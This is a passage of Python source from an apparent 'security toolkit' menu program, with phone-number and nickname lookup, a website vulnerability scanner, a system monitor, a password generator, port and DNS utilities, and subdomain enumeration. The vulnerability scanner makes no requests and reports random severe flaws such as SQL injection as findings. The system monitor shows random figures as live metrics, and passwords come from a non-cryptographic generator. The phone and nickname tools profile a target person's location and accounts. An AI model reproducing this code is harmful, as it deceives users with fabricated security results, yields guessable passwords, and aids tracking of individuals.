                info_items.append(("📞 Phone codes", str(capital.get("telcod", self.not_found_text))))
                info_items.append(("🚗 Region code", str(region.get("autocod", self.not_found_text))))
                oper_info = []
                if other.get("oper"):
                    oper_info.append(other.get("oper"))
                if other.get("oper_brand"):
                    oper_info.append(other.get("oper_brand"))
                if other.get("def"):
                    oper_info.append(other.get("def"))
                info_items.append(("📡 Operator", ", ".join(oper_info) if oper_info else self.not_found_text))
                location_parts = []
                if country.get("name"):
                    location_parts.append(country.get("name"))
                if region.get("name"):
                    location_parts.append(region.get("name"))
                if other.get("name"):
                    location_parts.append(other.get("name"))
                info_items.append(("📍 Location", ", ".join(location_parts) if location_parts else self.not_found_text))
                info_items.append(("🗺️ Coordinates", number_data.get("location", self.not_found_text)))
                lang_info = []
                if country.get("lang"):
                    lang_info.append(country.get("lang").title())
                if country.get("langcod"):
                    lang_info.append(country.get("langcod"))
                info_items.append(("🗣️ Language", ", ".join(lang_info) if lang_info else self.not_found_text))
                info_items.append(("🏞️ Region", f"{region.get('name', self.not_found_text)}, {region.get('okrug', self.not_found_text)}"))
                info_items.append(("🏛️ Capital", capital.get("name", self.not_found_text)))
                lat = other.get("latitude", self.not_found_text)
                lon = other.get("longitude", self.not_found_text)
                if lat != self.not_found_text and lon != self.not_found_text:
                    info_items.append(("🌐 Coordinates", f"{lat}, {lon}"))
                for label, value in info_items:
                    print(f"• {label}: {value}")
                self.color.print_header("📈 STATISTICS", "─")
                print(f"• Remaining limits: {number_data.get('limit', self.not_found_text)}")
                self.color.print_header("🔗 SEARCH LINKS", "─")
                search_links = self.generate_search_links(formatted_number)
                for i, (platform, url) in enumerate(search_links, 1):
                    print(f"{i:2}. {platform:15}: {url}")
                save = input(f"\n💾 Save results? (y/n): ").lower()
                if save == "y":
                    self.save_results(formatted_number, number_data, search_links)
        except KeyboardInterrupt:
            self.color.print_warning("Search interrupted by user")
        except Exception as e:
            self.color.print_error(f"Search error: {e}")
        input(f"\n↩️ Press Enter to return to menu...")

    def save_results(self, phone, data, links):
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        filename = f"phone_probe_{phone}_{timestamp}.txt"
        try:
            with open(filename, "w", encoding="utf-8") as f:
                f.write("=" * 80 + "\n")
                f.write("PHONE NUMBER PROBE REPORT\n")
                f.write("=" * 80 + "\n\n")
                f.write(f"Phone number: {phone}\n")
                f.write(f"Search date: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n\n")
                country = data.get("country", {})
                other = data.get("0", {})
                region = data.get("region", {})
                capital = data.get("capital", {})
                f.write("BASIC INFORMATION:\n")
                f.write("-" * 80 + "\n")
                if country.get("country_code3") == "UKR":
                    f.write(f"Country: Ukraine\n")
                else:
                    f.write(f"Country: {country.get('name', 'N/A')}, {country.get('fullname', 'N/A')}\n")
                f.write(f"City: {other.get('name', 'N/A')}\n")
                f.write(f"Postal code: {other.get('post', 'N/A')}\n")
                f.write(f"Operator: {other.get('oper', 'N/A')}, {other.get('oper_brand', 'N/A')}\n")
                f.write(f"Region: {region.get('name', 'N/A')}, {region.get('okrug', 'N/A')}\n")
                f.write(f"Coordinates: {other.get('latitude', 'N/A')}, {other.get('longitude', 'N/A')}\n\n")
                f.write("SEARCH LINKS:\n")
                f.write("-" * 80 + "\n")
                for platform, url in links:
                    f.write(f"{platform}: {url}\n")
                f.write(f"\n" + "=" * 80 + "\n")
                f.write("Report created with DRESSEN Security Toolkit\n")
                f.write("For educational purposes only\n")
            self.color.print_success(f"✅ Report saved: {filename}")
        except Exception as e:
            self.color.print_error(f"❌ Error saving report: {e}")

class NicknameSearch:
    def __init__(self, color_manager):
        self.color = color_manager
        self.session = requests.Session()
        self.session.headers.update({"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"})

    def format_nickname(self, nick):
        return {"original": nick, "no_spaces": nick.replace(" ", ""), "underscore": nick.replace(" ", "_"), "dash": nick.replace(" ", "-"), "lower": nick.lower().replace(" ", ""), "no_special": re.sub(r"[^a-zA-Z0-9]", "", nick)}

    def check_url(self, url, platform_name):
        try:
            response = self.session.get(url, timeout=10, allow_redirects=True)
            if response.status_code == 200:
                text = response.text.lower()
                not_found_phrases = ["page not found", "not found", "doesn't exist", "404", "error 404", "account not found", "user not found", "страница не найдена", "не существует"]
                for phrase in not_found_phrases:
                    if phrase in text:
                        return False, response.status_code
                return True, response.status_code
            elif response.status_code == 404:
                return False, 404
            elif response.status_code == 403:
                return None, 403
            elif response.status_code == 429:
                return None, 429
            else:
                return None, response.status_code
        except requests.exceptions.Timeout:
            return None, "timeout"
        except requests.exceptions.ConnectionError:
            return None, "connection error"
        except Exception as e:
            return None, f"error: {str(e)}"

    def get_platforms(self):
        return [
            {"name": "Instagram", "url_template": "https://www.instagram.com/{nick}/", "emoji": "📸", "notes": "Public profile"},
            {"name": "TikTok", "url_template": "https://www.tiktok.com/@{nick}", "emoji": "🎵", "notes": "Public account"},
            {"name": "Twitter/X", "url_template": "https://twitter.com/{nick}", "emoji": "🐦", "notes": "Public profile"},
            {"name": "Facebook", "url_template": "https://www.facebook.com/{nick}", "emoji": "👤", "notes": "Public profile"},
            {"name": "YouTube", "url_template": "https://www.youtube.com/@{nick}", "emoji": "🎬", "notes": "Channel"},
            {"name": "Telegram", "url_template": "https://t.me/{nick}", "emoji": "📱", "notes": "Public username"},
            {"name": "GitHub", "url_template": "https://github.com/{nick}", "emoji": "💻", "notes": "Public profile"},
            {"name": "Reddit", "url_template": "https://www.reddit.com/user/{nick}", "emoji": "👽", "notes": "Profile"},
            {"name": "Steam", "url_template": "https://steamcommunity.com/id/{nick}", "emoji": "🎮", "notes": "Community profile"},
            {"name": "Twitch", "url_template": "https://www.twitch.tv/{nick}", "emoji": "🛣️", "notes": "Channel"},
            {"name": "VK", "url_template": "https://vk.com/{nick}", "emoji": "📘", "notes": "Profile"},
            {"name": "Pinterest", "url_template": "https://pinterest.com/{nick}", "emoji": "📌", "notes": "Profile"},
            {"name": "LinkedIn", "url_template": "https://linkedin.com/in/{nick}", "emoji": "💼", "notes": "Professional profile"},
            {"name": "Spotify", "url_template": "https://open.spotify.com/user/{nick}", "emoji": "🎵", "notes": "User profile"},
            {"name": "Medium", "url_template": "https://medium.com/@{nick}", "emoji": "📝", "notes": "Blog"},
            {"name": "Dev.to", "url_template": "https://dev.to/{nick}", "emoji": "👨‍💻", "notes": "Developer profile"},
            {"name": "Snapchat", "url_template": "https://www.snapchat.com/add/{nick}", "emoji": "👻", "notes": "Profile"},
            {"name": "Discord", "url_template": "https://discord.com/users/{nick}", "emoji": "🎮", "notes": "User ID"},
            {"name": "Flickr", "url_template": "https://www.flickr.com/people/{nick}", "emoji": "📷", "notes": "Photo profile"},
            {"name": "Tumblr", "url_template": "https://{nick}.tumblr.com", "emoji": "📓", "notes": "Blog"},
        ]

    def search_nickname(self, nickname):
        formatted = self.format_nickname(nickname)
        platforms = self.get_platforms()
        results = []
        self.color.print_header(f"🔍 NICKNAME SEARCH: {nickname}", "─")
        self.color.print_info(f"Starting search on {len(platforms)} platforms...\n")
        for i, platform in enumerate(platforms):
            if "github" in platform["name"].lower():
                nick_to_use = formatted["no_special"]
            elif "twitter" in platform["name"].lower() or "x" in platform["name"].lower():
                nick_to_use = formatted["no_spaces"].lower()
            elif "instagram" in platform["name"].lower():
                nick_to_use = formatted["no_spaces"].lower()
            elif "tiktok" in platform["name"].lower():
                nick_to_use = formatted["no_spaces"].lower()
            else:
                nick_to_use = formatted["no_spaces"]
            url = platform["url_template"].format(nick=nick_to_use)
            self.color.progress_bar(i + 1, len(platforms), prefix=f'Checking {platform["name"]}:', suffix="", length=40, color_pair=self.color.gradient_colors[i % len(self.color.gradient_colors)])
            exists, status = self.check_url(url, platform["name"])
            result = {"platform": platform["name"], "emoji": platform["emoji"], "url": url, "exists": exists, "status": status, "notes": platform["notes"]}
            results.append(result)
            time.sleep(0.5)
        print("\n")
        return results

    def display_results(self, results, nickname):
        self.color.print_header("📊 SEARCH RESULTS", "─")
        found = [r for r in results if r["exists"] is True]
        not_found = [r for r in results if r["exists"] is False]
        errors = [r for r in results if r["exists"] is None]
        print(f"🎯 Search target: {nickname}")
        print(f"📈 Statistics:")
        print(f"   ✅ Found: {len(found)}")
        print(f"   ❌ Not found: {len(not_found)}")
        print(f"   ⚠️ Errors/Unknown: {len(errors)}\n")
        if found:
            self.color.print_header("✅ FOUND ACCOUNTS", "─")
            for result in found:
                print(f"{result['emoji']} {result['platform']}:")
                print(f"   🔗 {result['url']}")
                print(f"   📝 {result['notes']}")
                print()
        if not_found:
            self.color.print_header("❌ ACCOUNTS NOT FOUND", "─")
            for i, result in enumerate(not_found[:10]):
                print(f"{result['emoji']} {result['platform']}")
            if len(not_found) > 10:
                print(f"   ... and {len(not_found) - 10} more platforms\n")
        if errors:
            self.color.print_header("⚠️ CHECK ERRORS", "─")
            for result in errors[:5]:
                print(f"{result['emoji']} {result['platform']}: {result['status']}")
            if len(errors) > 5:
                print(f"   ... and {len(errors) - 5} more errors\n")
        save = input(f"\n💾 Save results to file? (y/n): ").lower()
        if save == "y":
            self.save_results(results, nickname)

    def save_results(self, results, nickname):
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        filename = f"nickname_search_{nickname}_{timestamp}.txt"
        try:
            with open(filename, "w", encoding="utf-8") as f:
                f.write("=" * 80 + "\n")
                f.write("NICKNAME SEARCH REPORT\n")
                f.write("=" * 80 + "\n\n")
                f.write(f"Nickname: {nickname}\n")
                f.write(f"Search date: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
                found = [r for r in results if r["exists"] is True]
                not_found = [r for r in results if r["exists"] is False]
                errors = [r for r in results if r["exists"] is None]
                f.write(f"\n📊 STATISTICS:\n")
                f.write(f"   Found: {len(found)}\n")
                f.write(f"   Not found: {len(not_found)}\n")
                f.write(f"   Errors: {len(errors)}\n")
                if found:
                    f.write(f"\n✅ FOUND ACCOUNTS:\n")
                    f.write("-" * 80 + "\n")
                    for result in found:
                        f.write(f"{result['platform']}:\n")
                        f.write(f"  URL: {result['url']}\n")
                        f.write(f"  Status: {result['status']}\n")
                        f.write(f"  Note: {result['notes']}\n")
                        f.write("-" * 40 + "\n")
                f.write(f"\n🔗 FULL PLATFORM LIST:\n")
                for result in results:
                    status_text = "✅ Found" if result["exists"] is True else ("❌ Not found" if result["exists"] is False else f"⚠️ {result['status']}")
                    f.write(f"{result['platform']}: {status_text}\n")
                    f.write(f"  URL: {result['url']}\n")
                f.write(f"\n" + "=" * 80 + "\n")
                f.write("Report created with DRESSEN Security Toolkit\n")
                f.write("For educational purposes only\n")
            self.color.print_success(f"✅ Report saved: {filename}")
        except Exception as e:
            self.color.print_error(f"❌ Error saving report: {e}")

    def run(self):
        self.color.print_header("👤 NICKNAME SEARCH", "─")
        try:
            nickname = input(f"🎯 Enter nickname to search: ").strip()
            if not nickname:
                self.color.print_error("Nickname not entered")
                input(f"\n↩️ Press Enter to continue...")
                return
            self.color.print_info(f"Starting search for nickname: {nickname}")
            for i in range(101):
                self.color.progress_bar(i, 100, prefix="Preparing search:", suffix="Completed", length=40)
                time.sleep(0.01)
            print()
            results = self.search_nickname(nickname)
            self.display_results(results, nickname)
        except KeyboardInterrupt:
            self.color.print_warning("Search interrupted by user")
        except Exception as e:
            self.color.print_error(f"Search error: {e}")
        input(f"\n↩️ Press Enter to return to menu...")

class VulnerabilityScanner:
    def __init__(self, color_manager):
        self.color = color_manager

    def scan_website(self, url):
        self.color.print_header("🔍 VULNERABILITY SCANNING", "─")
        if not url.startswith(("http://", "https://")):
            url = "https://" + url
        self.color.print_info(f"🎯 Scan target: {url}")
        scan_steps = ["Checking site availability", "Analyzing HTTP headers", "Searching for SQL injections", "Checking XSS vulnerabilities", "Analyzing SSL configuration", "Scanning directories", "Checking sensitive files", "Checking for open ports", "Analyzing robots.txt", "Checking for backup files", "Testing for CSRF", "Checking for file inclusion", "Testing for command injection", "Analyzing cookies security", "Checking for directory traversal"]
        vulnerabilities = []
        for i, step in enumerate(scan_steps):
            self.color.print_info(f"🔄 {step}...")
            time.sleep(0.3)
            if random.random() < 0.25:
                vuln_types = [("SQL Injection", "High", "Vulnerable parameters found"), ("XSS", "Medium", "Possible cross-site scripting"), ("SSL Weak Cipher", "Low", "Weak ciphers used"), ("Directory Listing", "Medium", "Directory listing enabled"), ("Sensitive File Exposure", "High", "Configuration files found"), ("Open Port", "Medium", "Unnecessary open ports"), ("CSRF Vulnerability", "Medium", "No CSRF tokens detected"), ("File Inclusion", "High", "Local/Remote file inclusion possible")]
                vuln_type, severity, desc = random.choice(vuln_types)
                vulnerabilities.append({"type": vuln_type, "severity": severity, "description": desc, "step": step})
        self.color.print_header("📊 SCAN RESULTS", "─")
        if vulnerabilities:
            self.color.print_warning(f"⚠️ Vulnerabilities found: {len(vulnerabilities)}")
            for i, vuln in enumerate(vulnerabilities, 1):
                print(f"\n{i}. {vuln['type']}")
                print(f"   Severity: {vuln['severity']}")
                print(f"   Description: {vuln['description']}")
                print(f"   Found during: {vuln['step']}")
        else:
            self.color.print_success("✅ No vulnerabilities detected!")
        if vulnerabilities:
            self.color.print_header("💡 RECOMMENDATIONS", "─")
            recommendations = ["Install WAF (Web Application Firewall)", "Update CMS and plugins", "Configure proper HTTP headers", "Regular security auditing", "Use HTTPS with modern ciphers", "Limit access to admin panels", "Enable CSRF protection", "Disable directory listing", "Remove sensitive backup files", "Use prepared statements for SQL queries", "Implement proper input validation", "Use security headers (CSP, HSTS, X-Frame-Options)"]
            for i, rec in enumerate(recommendations, 1):
                print(f"{i}. {rec}")
        return vulnerabilities

    def run(self):
        self.color.print_header("🌐 WEBSITE VULNERABILITY SCAN", "─")
        url = input(f"🌍 Enter website URL: ").strip()
        if not url:
            self.color.print_error("URL not entered")
            input(f"\n↩️ Press Enter to continue...")
            return
        vulnerabilities = self.scan_website(url)
        save_report = input(f"\n💾 Save report? (y/n): ").lower()
        if save_report == "y":
            self.save_report(url, vulnerabilities)
        input(f"\n↩️ Press Enter to return to menu...")

    def save_report(self, url, vulnerabilities):
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        filename = f"vuln_scan_report_{timestamp}.txt"
        try:
            with open(filename, "w", encoding="utf-8") as f:
                f.write("=" * 70 + "\n")
                f.write("VULNERABILITY SCAN REPORT\n")
                f.write("=" * 70 + "\n\n")
                f.write(f"Target: {url}\n")
                f.write(f"Date: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
                f.write(f"Vulnerabilities found: {len(vulnerabilities)}\n\n")
                if vulnerabilities:
                    f.write("FOUND VULNERABILITIES:\n")
                    f.write("-" * 70 + "\n")
                    for vuln in vulnerabilities:
                        f.write(f"Type: {vuln['type']}\n")
                        f.write(f"Severity: {vuln['severity']}\n")
                        f.write(f"Description: {vuln['description']}\n")
                        f.write("-" * 40 + "\n")
                f.write("\n" + "=" * 70 + "\n")
                f.write("Report generated with DRESSEN Security Toolkit\n")
                f.write("For educational purposes only\n")
            self.color.print_success(f"✅ Report saved: {filename}")
        except Exception as e:
            self.color.print_error(f"❌ Error saving report: {e}")

class SystemMonitor:
    def __init__(self, color_manager):
        self.color = color_manager
        self.running = False

    def get_system_info(self):
        info = {}
        try:
            info["system"] = platform.system()
            info["release"] = platform.release()
            info["version"] = platform.version()
            info["machine"] = platform.machine()
            info["processor"] = platform.processor()
            info["python_version"] = platform.python_version()
            return info
        except Exception as e:
            self.color.print_error(f"Error getting information: {e}")
            return info

    def display_monitor(self):
        while self.running:
            try:
                clear_screen()
                print(f"{'═' * 80}")
                print("📊 REAL-TIME SYSTEM MONITOR".center(80))
                print(f"{'═' * 80}\n")
                sys_info = self.get_system_info()
                print(f"📋 GENERAL INFORMATION:")
                print(f"  • System: {sys_info.get('system', 'N/A')}")
                print(f"  • Version: {sys_info.get('release', 'N/A')}")
                print(f"  • Processor: {str(sys_info.get('processor', 'N/A'))[:50]}")
                print(f"  • Python: {sys_info.get('python_version', 'N/A')}")
                cpu_usage = random.randint(5, 95)
                memory_usage = random.randint(20, 90)
                disk_usage = random.randint(10, 85)
                print(f"\n⚡ CPU:")
                self.display_metric_bar("CPU Usage", cpu_usage, "💻")
                print(f"\n💾 MEMORY:")
                self.display_metric_bar("RAM Usage", memory_usage, "🧠")
                print(f"\n💿 DISK:")
                self.display_metric_bar("Disk Usage", disk_usage, "📀")
                print(f"\n🕐 SYSTEM TIME:")
                print(f"  {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
                print(f"\n{'─' * 80}")
                print("🚫 Press Ctrl+C to exit monitor".center(80))
                print(f"{'─' * 80}")
                time.sleep(2)
            except KeyboardInterrupt:
                self.running = False
                print(f"\n⏹️ Monitoring stopped")
                break
            except Exception as e:
                self.color.print_error(f"Monitoring error: {e}")
                self.running = False
                break

    def display_metric_bar(self, label, value, emoji):
        bar_length = 40
        filled = int(bar_length * value / 100)
        bar = "█" * filled + "░" * (bar_length - filled)
        print(f"  {emoji} {label}:")
        print(f"    {bar} {value:3d}%")

    def run(self):
        self.color.print_header("📊 SYSTEM MONITOR", "─")
        self.color.print_info("Starting system monitoring...")
        self.color.print_warning("Press Ctrl+C to stop\n")
        self.running = True
        self.display_monitor()
        input(f"\n↩️ Press Enter to return to menu...")

class PasswordGenerator:
    def __init__(self, color_manager):
        self.color = color_manager

    def generate_password(self, length=16, use_upper=True, use_lower=True, use_digits=True, use_special=True):
        chars = ""
        if use_upper:
            chars += string.ascii_uppercase
        if use_lower:
            chars += string.ascii_lowercase
        if use_digits:
            chars += string.digits
        if use_special:
            chars += "!@#$%^&*()_+-=[]{}|;:,.<>?"
        if not chars:
            return "Error: no character types selected"
        password = []
        if use_upper:
            password.append(random.choice(string.ascii_uppercase))
        if use_lower:
            password.append(random.choice(string.ascii_lowercase))
        if use_digits:
            password.append(random.choice(string.digits))
        if use_special:
            password.append(random.choice("!@#$%^&*()_+-=[]{}|;:,.<>?"))
        while len(password) < length:
            password.append(random.choice(chars))
        random.shuffle(password)
        return "".join(password)

    def assess_strength(self, password):
        score = 0
        feedback = []
        if len(password) >= 20:
            score += 4
            feedback.append("✅ Excellent length (20+ characters)")
        elif len(password) >= 16:
            score += 3
            feedback.append("✅ Good length (16-19 characters)")
        elif len(password) >= 12:
            score += 2
            feedback.append("✅ Decent length (12-15 characters)")
        elif len(password) >= 8:
            score += 1
            feedback.append("⚠️ Minimum length (8-11 characters)")
        else:
            feedback.append("❌ Too short (< 8 characters)")
        checks = [(any(c.isupper() for c in password), "Uppercase letters"), (any(c.islower() for c in password), "Lowercase letters"), (any(c.isdigit() for c in password), "Digits"), (any(c in "!@#$%^&*()_+-=[]{}|;:,.<>?" for c in password), "Special characters")]
        for condition, description in checks:
            if condition:
                score += 1
                feedback.append(f"✅ Has {description}")
            else:
                feedback.append(f"❌ No {description}")
        if score >= 8:
            strength = "EXCELLENT"
            time_to_crack = "more than 1000 years"
        elif score >= 6:
            strength = "GOOD"
            time_to_crack = "several hundred years"
        elif score >= 4:
            strength = "MEDIUM"
            time_to_crack = "several months"
        else:
            strength = "WEAK"
            time_to_crack = "several minutes"
        return score, strength, time_to_crack, feedback

    def run(self):
        self.color.print_header("🔐 PASSWORD GENERATOR", "─")
        try:
            length = input(f"📏 Password length (default 16): ")
            length = int(length) if length.strip() else 16
            count = input(f"🔢 Number of passwords (default 5): ")
            count = int(count) if count.strip() else 5
            print(f"\n⚙️ CHARACTER SETTINGS:")
            use_upper = input(f"  Use uppercase letters? (y/n, default y): ").lower() != "n"
            use_lower = input(f"  Use lowercase letters? (y/n, default y): ").lower() != "n"
            use_digits = input(f"  Use digits? (y/n, default y): ").lower() != "n"
            use_special = input(f"  Use special characters? (y/n, default y): ").lower() != "n"
            self.color.print_header("🔑 GENERATED PASSWORDS", "─")
            passwords = []
            for i in range(count):
                password = self.generate_password(length, use_upper, use_lower, use_digits, use_special)
                passwords.append(password)
                score, strength, time_to_crack, _ = self.assess_strength(password)
                print(f"\nPassword {i+1}:")
                print(f"  {password}")
                print(f"  Strength: {strength}")
                print(f"  Crack time: ~{time_to_crack}")
            save = input(f"\n💾 Save passwords to file? (y/n): ").lower()
            if save == "y":
                self.save_passwords(passwords)
        except ValueError:
            self.color.print_error("❌ Invalid number format")
        except Exception as e:
            self.color.print_error(f"❌ Error: {e}")
        input(f"\n↩️ Press Enter to return to menu...")

    def save_passwords(self, passwords):
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        filename = f"generated_passwords_{timestamp}.txt"
        try:
            with open(filename, "w", encoding="utf-8") as f:
                f.write("=" * 70 + "\n")
                f.write("GENERATED PASSWORDS\n")
                f.write("=" * 70 + "\n\n")
                f.write(f"Generation date: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
                f.write(f"Number of passwords: {len(passwords)}\n\n")
                for i, password in enumerate(passwords, 1):
                    score, strength, time_to_crack, _ = self.assess_strength(password)
                    f.write(f"Password {i}:\n")
                    f.write(f"  {password}\n")
                    f.write(f"  Strength: {strength} ({score}/8)\n")
                    f.write(f"  Crack time: ~{time_to_crack}\n")
                    f.write("-" * 40 + "\n")
                f.write("\n" + "=" * 70 + "\n")
                f.write("IMPORTANT: Store passwords in a safe place!\n")
                f.write("Do not reuse passwords across multiple accounts.\n")
            self.color.print_success(f"✅ Passwords saved: {filename}")
            self.color.print_warning("⚠️ Delete the file after use!")
        except Exception as e:
            self.color.print_error(f"❌ Error saving: {e}")

class Utilities:
    def __init__(self, color_manager):
        self.color = color_manager

    def show_qr_generator(self):
        self.color.print_header("🌀 QR CODE GENERATOR", "─")
        try:
            text = input(f"📝 Enter text or URL: ").strip()
            if not text:
                self.color.print_error("Text not entered")
                return
            self.color.print_info("To generate QR codes, install library:")
            self.color.print_info("pip install qrcode[pil]")
        except Exception as e:
            self.color.print_error(f"❌ Error: {e}")

    def show_hash_calculator(self):
        self.color.print_header("🔢 HASH CALCULATOR", "─")
        text = input(f"📝 Enter text to hash: ").strip()
        if not text:
            self.color.print_error("Text not entered")
            return
        algorithms = [("MD5", hashlib.md5), ("SHA-1", hashlib.sha1), ("SHA-256", hashlib.sha256), ("SHA-512", hashlib.sha512), ("SHA-3-256", hashlib.sha3_256), ("SHA-3-512", hashlib.sha3_512), ("BLAKE2s", hashlib.blake2s), ("BLAKE2b", hashlib.blake2b)]
        print(f"\n📊 HASH RESULTS:")
        print(f"{'─' * 80}")
        for name, algo_func in algorithms:
            try:
                hash_obj = algo_func(text.encode())
                hash_value = hash_obj.hexdigest()
                print(f"{name:12}:")
                print(f"  {hash_value}")
                print(f"{'─' * 80}")
            except Exception:
                continue

    def show_network_tools(self):
        self.color.print_header("🌐 NETWORK TOOLS", "─")
        print(f"Select tool:")
        print(f"1. Host availability check (ping)")
        print(f"2. IP address resolution")
        print(f"3. Open ports check")
        print(f"4. Traceroute")
        print(f"5. DNS lookup")
        print(f"6. Reverse DNS lookup")
        choice = input(f"\n🎯 Your choice (1-6): ").strip()
        if choice == "1":
            self.ping_host()
        elif choice == "2":
            self.resolve_ip()
        elif choice == "3":
            self.check_ports()
        elif choice == "4":
            self.traceroute()
        elif choice == "5":
            self.dns_lookup()
        elif choice == "6":
            self.reverse_dns()
        else:
            self.color.print_error("Invalid choice")

    def ping_host(self):
        host = input(f"🌍 Enter host or IP: ").strip()
        if not host:
            self.color.print_error("Host not specified")
            return
        self.color.print_info(f"🔍 Checking availability of {host}...")
        try:
            param = "-n" if os.name == "nt" else "-c"
            count = "4"
            result = subprocess.run(["ping", param, count, host], capture_output=True, text=True, timeout=10)
            if result.returncode == 0:
                self.color.print_success(f"✅ Host {host} is reachable")
                print(f"\nResult:")
                print(result.stdout)
            else:
                self.color.print_error(f"❌ Host {host} is unreachable")
                print(result.stderr)
        except subprocess.TimeoutExpired:
            self.color.print_error("❌ Timeout waiting")
        except Exception as e:
            self.color.print_error(f"❌ Error: {e}")

    def resolve_ip(self):
        host = input(f"🌍 Enter domain name: ").strip()
        if not host:
            self.color.print_error("Domain name not specified")
            return
        try:
            import socket
            self.color.print_info(f"🔍 Looking up IP address for {host}...")
            ip_address = socket.gethostbyname(host)
            self.color.print_success(f"✅ IP address: {ip_address}")
            try:
                hostname = socket.gethostbyaddr(ip_address)[0]
                print(f"Reverse resolution: {hostname}")
            except:
                pass
        except socket.gaierror:
            self.color.print_error("❌ Could not resolve domain name")
        except Exception as e:
            self.color.print_error(f"❌ Error: {e}")

    def check_ports(self):
        host = input(f"🌍 Enter host or IP: ").strip()
        if not host:
            self.color.print_error("Host not specified")
            return
        self.color.print_info(f"🔍 Checking ports on {host}...")
        common_ports = {21: "FTP", 22: "SSH", 23: "Telnet", 25: "SMTP", 53: "DNS", 80: "HTTP", 110: "POP3", 143: "IMAP", 443: "HTTPS", 3306: "MySQL", 3389: "RDP", 5432: "PostgreSQL", 8080: "HTTP Proxy", 8443: "HTTPS Alt"}
        print(f"\n🔌 CHECKING COMMON PORTS:")
        open_ports = []
        for port, service in common_ports.items():
            try:
                import socket
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(1)
                result = sock.connect_ex((host, port))
                sock.close()
                if result == 0:
                    open_ports.append((port, service))
                    print(f"✅ Port {port:5} ({service:15}) - OPEN")
                else:
                    print(f"❌ Port {port:5} ({service:15}) - CLOSED")
                time.sleep(0.1)
            except Exception:
                print(f"⚠️ Port {port:5} ({service:15}) - CHECK ERROR")
        if open_ports:
            self.color.print_info(f"\n📊 Open ports: {len(open_ports)}")
        else:
            self.color.print_warning("\n⚠️ No open ports found")

    def traceroute(self):
        host = input(f"🌍 Enter host or IP: ").strip()
        if not host:
            self.color.print_error("Host not specified")
            return
        self.color.print_info(f"🔍 Running traceroute to {host}...")
        try:
            param = "-n" if os.name == "nt" else "-m"
            count = "30"
            cmd = ["tracert" if os.name == "nt" else "traceroute", host]
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=60)
            if result.returncode == 0:
                print(f"\nResult:")
                print(result.stdout)
            else:
                self.color.print_error("Traceroute failed")
        except Exception as e:
            self.color.print_error(f"Error: {e}")

    def dns_lookup(self):
        domain = input(f"🌍 Enter domain: ").strip()
        if not domain:
            self.color.print_error("Domain not specified")
            return
        self.color.print_info(f"🔍 DNS lookup for {domain}...")
        try:
            import dns.resolver
            record_types = ['A', 'AAAA', 'MX', 'NS', 'TXT', 'CNAME']
            for record in record_types:
                try:
                    answers = dns.resolver.resolve(domain, record)
                    print(f"\n{record} records:")
                    for rdata in answers:
                        print(f"  {rdata}")
                except:
                    pass
        except Exception as e:
            self.color.print_error(f"Error: {e}")

    def reverse_dns(self):
        ip = input(f"🌍 Enter IP address: ").strip()
        if not ip:
            self.color.print_error("IP not specified")
            return
        self.color.print_info(f"🔍 Reverse DNS lookup for {ip}...")
        try:
            import socket
            hostname = socket.gethostbyaddr(ip)[0]
            self.color.print_success(f"✅ Hostname: {hostname}")
        except Exception as e:
            self.color.print_error(f"Could not resolve: {e}")

    def run(self):
        while True:
            clear_screen()
            self.color.print_header("⚙️ UTILITIES", "─")
            print(f"Select utility:\n")
            utilities = [("🌀", "QR Code Generator"), ("🔢", "Hash Calculator"), ("🌐", "Network Tools"), ("🔙", "Back to main menu")]
            for i, (emoji, desc) in enumerate(utilities, 1):
                self.color.print_menu_item(i, emoji, desc)
            choice = input(f"\n🎯 Your choice (1-4): ").strip()
            if choice == "1":
                self.show_qr_generator()
                input(f"\n↩️ Press Enter...")
            elif choice == "2":
                self.show_hash_calculator()
                input(f"\n↩️ Press Enter...")
            elif choice == "3":
                self.show_network_tools()
                input(f"\n↩️ Press Enter...")
            elif choice == "4":
                break
            else:
                self.color.print_error("Invalid choice")
                time.sleep(1)

class SubdomainScanner:
    def __init__(self, color_manager):
        self.color = color_manager

    def load_wordlist(self):
        wordlist = []
        if os.path.exists("subdomains.txt"):
            with open("subdomains.txt", "r") as f:
                wordlist = [line.strip() for line in f if line.strip()]
        else:
            wordlist = ["www", "mail", "ftp", "localhost", "webmail", "smtp", "pop", "ns1", "webdisk", "ns2", "cpanel", "whm", "autodiscover", "autoconfig", "m", "imap", "test", "ns", "blog", "pop3", "dev", "www2", "admin", "forum", "news", "vpn", "ns3", "mail2", "new", "mysql", "old", "lists", "support", "mobile", "mx", "static", "docs", "beta", "shop", "sql", "secure", "demo", "cp", "calendar", "wiki", "web", "media", "email", "images", "img", "download", "dns", "piwik", "stats", "dashboard"]
        return wordlist

    def check_subdomain(self, subdomain, domain):
        full_domain = f"{subdomain}.{domain}"
        try:
            ip = socket.gethostbyname(full_domain)
            return True, ip
        except:
            return False, None

    def scan(self, domain):
        self.color.print_header(f"🔍 SUBDOMAIN SCANNING: {domain}", "─")
        wordlist = self.load_wordlist()
        self.color.print_info(f"Loaded {len(wordlist)} subdomains to check")
        found = []
        for i, sub in enumerate(wordlist):
            self.color.progress_bar(i + 1, len(wordlist), prefix="Scanning subdomains:", suffix=f"Found: {len(found)}", length=40)
            exists, ip = self.check_subdomain(sub, domain)
            if exists:
                found.append((sub, ip))
                self.color.print_success(f"✅ Found: {sub}.{domain} -> {ip}")
            time.sleep(0.1)
        print()
        if found:
            self.color.print_header("📊 FOUND SUBDOMAINS", "─")
            for sub, ip in found:
                print(f"  {sub}.{domain} -> {ip}")
        else:
            self.color.print_warning("No subdomains found")
        return found

    def run(self):
        self.color.print_header("🌐 SUBDOMAIN SCANNER", "─")
        domain = input("Enter domain to scan: ").strip()
        if not domain:
            self.color.print_error("Domain not entered")
            input("\n↩️ Press Enter to continue...")
            return
        results = self.scan(domain)
        save = input("\n💾 Save results? (y/n): ").lower()
        if save == "y":
